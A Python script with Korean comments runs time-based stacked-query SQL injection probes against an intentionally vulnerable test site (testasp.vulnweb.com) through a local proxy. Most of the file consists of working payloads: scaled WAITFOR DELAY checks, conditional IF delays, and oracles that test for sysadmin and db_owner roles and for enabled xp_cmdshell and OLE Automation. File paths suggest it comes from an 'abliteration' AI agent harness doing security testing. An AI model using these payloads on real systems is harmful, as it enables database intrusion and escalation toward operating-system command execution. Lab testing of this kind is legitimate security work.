#!/usr/bin/env python3
"""Round 7 보강 — stacked query 실행 가능성 정밀 확인 (읽기 전용).

E1: WAITFOR 지연값을 바꿔가며 타이밍이 비례하는지(진짜 실행인지, 우연한 지연인지)
E2: IF 조건부 지연으로 임의 T-SQL 문장 실행 가능성 확인
E3: DB 사용자 권한(sysadmin/서버 역할) 및 xp_cmdshell 활성 여부 — 지연 오라클로만 판정
"""
import os
import subprocess
import urllib.parse

BASE = "http://testasp.vulnweb.com"
PROXY = ["-x", "http://127.0.0.1:8080",
         "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]
J = "/home/taeuk/projects/llm-abliteration/hermes-harness/journal/web/testphp-vulnweb-test"
SCR = f"{J}/scratch/r7"
EVI = f"{J}/evidence/r7"
os.makedirs(SCR, exist_ok=True)
os.makedirs(EVI, exist_ok=True)


def timed(url, timeout=60):
    cmd = ["curl", "-s", "-S"] + PROXY + [
        "-m", str(timeout), "-o", "/dev/null",
        "-w", "%{http_code} %{size_download} %{time_total}", url]
    r = subprocess.run(cmd, capture_output=True, text=True)
    return (r.stdout or "").strip() or "ERR " + (r.stderr or "").strip()[:100]


def sf(payload):
    """showforum.asp?id=<payload> 요청 → 'code size time'"""
    return timed(f"{BASE}/showforum.asp?id={urllib.parse.quote(payload, safe='=()&,')}")


def st(payload):
    return timed(f"{BASE}/showthread.asp?id={urllib.parse.quote(payload, safe='=()&,')}")


print("=" * 72)
print("E1. WAITFOR 지연 스케일링 (showforum.asp id)")
print("=" * 72)
for d in ["0:0:01", "0:0:03", "0:0:08"]:
    p = f"1;WAITFOR DELAY '{d}'--"
    print(f"  {p:44} → {sf(p)}")
print(f"  {'1 (기준선)':44} → {sf('1')}")
print()
print("=== showthread.asp id 동일 확인 ===")
for d in ["0:0:02", "0:0:08"]:
    p = f"0;WAITFOR DELAY '{d}'--"
    print(f"  {p:44} → {st(p)}")

print()
print("=" * 72)
print("E2. IF 조건부 지연 = 임의 T-SQL 문장 실행 확인 (showthread.asp)")
print("=" * 72)
cases = [
    ("IF 1=1 WAITFOR DELAY '0:0:04'--", "항상 참 → 4s 나와야 함"),
    ("IF 1=2 WAITFOR DELAY '0:0:04'--", "항상 거짓 → 지연 없어야 함"),
]
for p, desc in cases:
    print(f"  {p:38} → {st(p)}   ({desc})")

print()
print("=" * 72)
print("E3. DB 권한 / xp_cmdshell (조건부 지연 오라클, 실행 없음)")
print("=" * 72)
checks = [
    ("1;IF (SELECT IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:05'--",
     "sysadmin 역할 여부"),
    ("1;IF (SELECT IS_SRVROLEMEMBER('db_owner'))=1 WAITFOR DELAY '0:0:05'--",
     "db_owner 여부"),
    ("1;IF (SELECT USER_NAME())='dbo' WAITFOR DELAY '0:0:05'--", "현재 사용자=dbo"),
    ("1;IF EXISTS(SELECT 1 FROM sys.configurations WHERE name='xp_cmdshell' AND value_in_use=1) WAITFOR DELAY '0:0:05'--",
     "xp_cmdshell 활성"),
    ("1;IF EXISTS(SELECT 1 FROM sys.configurations WHERE name='Ole Automation Procedures' AND value_in_use=1) WAITFOR DELAY '0:0:05'--",
     "Ole Automation 활성"),
]
for p, desc in checks:
    print(f"  [{desc}]")
    print(f"    {p}")
    print(f"    → {sf(p)}")

print()
print("=" * 72)
print("E4. stacked 로 읽기 DML 가능성 확인용(실행 안 함) — 참고 정보만")
print("=" * 72)
print("  sysadmin 이면 xp_cmdshell 로 OS 명령 실행 가능 → 별도 사전 승인 필요(실행 안 함)")
